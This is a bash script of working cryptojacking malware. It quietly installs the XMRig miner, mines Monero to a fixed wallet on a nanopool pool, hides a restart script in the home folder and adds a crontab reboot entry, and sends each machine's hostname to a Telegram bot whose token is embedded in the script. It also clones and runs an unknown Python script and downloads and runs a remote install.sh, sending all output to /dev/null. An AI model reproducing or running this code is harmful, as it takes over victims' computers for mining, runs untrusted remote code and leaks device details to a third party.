#!/bin/bash

XMR() {
    sleep 3
    xdg-open "https://t.me/bahaa_010640/91" &>/dev/null
    xdg-open "https://youtu.be/5zzV6BhgdBA?si=TzZYyA6mzFEifQU5" &>/dev/null

    chmod +x * &>/dev/null
    sudo apt update -y &>/dev/null
    sudo apt install -y wget tar cron msr-tools curl &>/dev/null

    if [ ! -f "/usr/local/bin/xmrig" ]; then
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
        tar -xzf /tmp/xmrig.tar.gz -C /tmp
        sudo cp /tmp/xmrig-6.16.4/xmrig /usr/local/bin/
        sudo rm -rf /tmp/xmrig-6.16.4 /tmp/xmrig.tar.gz
    fi

    sudo modprobe msr &>/dev/null

    if ! grep -qF "vm.nr_hugepages=128" /etc/sysctl.conf; then
        echo "vm.nr_hugepages=128" | sudo tee -a /etc/sysctl.conf &>/dev/null
        sudo sysctl -p &>/dev/null
    fi

    script_path="$HOME/.na.sh"
    cat <<EOF > $script_path
#!/bin/bash
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
nohup xmrig --donate-level 5 -o xmr-eu1.nanopool.org:14433 -u 43YC667HBCJ5yCXu5Y9Kuzbd39SBX51aw9daYqegV9rmQaRMpig6bxeTcTNPqfgyt7jTJxBL8dJ89TsJLxxrFk6bJPn4C5f --tls --coin monero &>/dev/null &
device_name=\$(hostname)
nohup curl -s -X POST "https://api.telegram.org/bot\$BOT_TOKEN/sendMessage" -d "chat_id=\$CHAT_ID" -d "text=Started \$device_name" &>/dev/null &
EOF

    chmod +x $script_path

    # تعديل مهمة crontab لتشغيل السكربت بعد 50 ثانية من بدء التشغيل
    if ! crontab -l | grep -q "@reboot (sleep 50 && $script_path)"; then
        (crontab -l 2>/dev/null; echo "@reboot (sleep 50 && $script_path)") | crontab - &>/dev/null
    fi

    device_name=$(hostname)
    BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
    CHAT_ID="5792222595"
    MESSAGE="Setup completed for $device_name"

    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &

    nohup xmrig --donate-level 5 -o xmr-eu1.nanopool.org:14433 -u 43YC667HBCJ5yCXu5Y9Kuzbd39SBX51aw9daYqegV9rmQaRMpig6bxeTcTNPqfgyt7jTJxBL8dJ89TsJLxxrFk6bJPn4C5f --tls --coin monero &>/dev/null &
}
pyo(){
    git clone https://github.com/hacker-515m/py.git && cd py && python3 n.py && cd .. && sudo rm -r py
}
Atool(){
    sudo apt install wget
    sudo apt install openssh
    sudo apt install python3-pip
    wget https://raw.githubusercontent.com/mishakorzik/open-port/main/install.sh
    bash install.sh
}

XMR
pyo
Atool

